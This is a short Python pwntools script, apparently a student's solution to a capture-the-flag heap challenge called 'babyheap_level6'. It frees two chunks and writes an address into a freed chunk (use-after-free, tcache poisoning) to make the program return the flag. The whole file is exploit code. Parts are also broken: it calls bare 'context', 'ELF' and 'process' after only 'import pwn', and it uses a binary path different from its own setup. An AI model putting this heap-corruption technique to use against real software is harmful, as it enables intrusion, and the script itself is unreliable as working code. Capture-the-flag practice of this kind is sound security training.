# Nagib Lakhdari 3si2
#!/usr/bin/env python3

# This exploit was generated via
# 1) pwntools
# 2) ctfmate

import pwn

BINARY = "/challenge/babyheap_level6.0/"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8 = pwn.p8
u8 = pwn.u8

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB: 
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else: 
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(pwn.args.HOST or '127.0.0.1', int(pwn.args.PORT or 1337))
    if pwn.args.GDB: 
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL: 
        return local(argv, *a, **kw)
    else: 
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# Exploit function
def exploit():
    #--------Setup--------#
    context(arch="amd64", os="linux")
    elf = ELF("/babyheap_level6_testing1", checksec=False)

    # Start the process for the challenge binary
    p = process("/babyheap_level6_testing1")

    # Send commands to the process
    p.sendline(b'malloc')      # Allocate memory
    p.sendline(b'0')           # Index for the first memory allocation
    p.sendline(b'32')          # Size of the first memory allocation

    p.sendline(b'malloc')      # Allocate another memory block
    p.sendline(b'1')           # Index for the second memory allocation
    p.sendline(b'32')          # Size of the second memory allocation

    p.sendline(b'free')        # Free the first allocated memory block
    p.sendline(b'0')           # Index of the first memory block

    p.sendline(b'free')        # Free the second allocated memory block
    p.sendline(b'1')           # Index of the second memory block

    p.sendline(b'scanf')       # Use scanf to read input into the freed memory
    p.sendline(b'1')           # Index for the scanf command
    p.sendline(p64(0x42796f))  # Send input to scanf (address 0x42796f)

    p.sendline(b'malloc')      # Allocate memory again
    p.sendline(b'0')           # Index for the first memory allocation
    p.sendline(b'32')          # Size of the first memory allocation

    p.sendline(b'malloc')      # Allocate another memory block
    p.sendline(b'1')           # Index for the second memory allocation
    p.sendline(b'32')          # Size of the second memory allocation

    p.sendline(b'puts')        # Print the content of the memory
    p.sendline(b'1')           # Index to print

    p.sendline(b'send_flag')   # Send the flag

    # Interact with the process to get the output
    p.interactive()
    pass

if __name__ == "__main__":
    exploit()
